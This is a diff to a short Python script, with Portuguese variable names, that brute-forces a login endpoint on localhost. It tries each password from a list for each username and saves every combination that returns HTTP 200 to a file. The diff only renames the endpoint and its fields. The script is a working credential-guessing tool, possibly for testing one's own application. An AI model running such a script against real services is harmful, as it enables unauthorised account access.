@@ -1,6 +1,4 @@
 import requests
-import json
-
 
 with open("usuarios_validos.txt", "r") as listausuarios:
     linhas = listausuarios.readlines()
@@ -14,9 +12,9 @@ with open("usuarios_validos.txt", "r") as listausuarios:
             
             for password in passwords:
                 senha = password.strip()    
-                payload  = {'login': nome_usuario, 'senha': senha}
-                r = requests.post('http://localhost:8080/usuario/login', json=payload)
+                payload  = {'login': nome_usuario, 'password': senha}
+                r = requests.post('http://localhost:8080/auth/login', json=payload)
                 retorno = r.status_code
                 if (retorno == 200):
                     with open("senhas_validas.txt", "a") as resultado:
-                        resultado.write("\nUsuário: " + nome_usuario + "| Senha: "+senha)
+                        resultado.write("\nLogin: " + nome_usuario + " | Senha: "+senha)
